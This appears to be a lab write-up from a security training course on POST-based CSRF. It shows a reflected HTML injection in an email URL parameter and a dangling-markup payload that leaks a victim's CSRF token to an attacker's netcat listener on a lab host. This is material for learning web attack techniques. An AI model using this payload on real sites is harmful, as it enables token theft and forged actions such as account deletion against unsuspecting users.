---
title: g-POST Based CSRF
draft: false
tags:
  - csrf
---
The vast majority of applications nowadays perform actions through POST requests. Subsequently, CSRF tokens will reside in POST data. Let us attack such an application and try to find a way to leak the CSRF token so that we can mount a CSRF attack.

## Exploit

> Log-in to vulnerable web app. You can delete your account.

Let's see how one could steal the user's CSRF-Token by exploiting an HTML injection/XSS vulnerability.

Click on the "Delete" button. You will get redirected to `/app/delete/<your-email>`

Notice that the email is reflected on the page. Let us try inputting some HTML into the _email_ value, such as:

```html
<h1>h1<u>underline<%2fu><%2fh1>
```

Above actually underlined.

If you inspect the source (`Ctrl+U`), you will notice that our injection happens before a `single quote`. We can abuse this to leak the CSRF-Token.

Let us first instruct Netcat to listen on port 8000, as follows.

```shell-session
jadu101@htb[/htb]$ nc -nlvp 8000
listening on [any] 8000 ...
```

Now we can get the CSRF token via sending the below payload to our victim.

```html
<table%20background='%2f%2f<VPN/TUN Adapter IP>:PORT%2f
```

While still logged in as Julie Rogers, open a new tab and visit `http://csrf.htb.net/app/delete/%3Ctable background='%2f%2f<VPN/TUN Adapter IP>:8000%2f`. You will notice a connection being made that leaks the CSRF token.

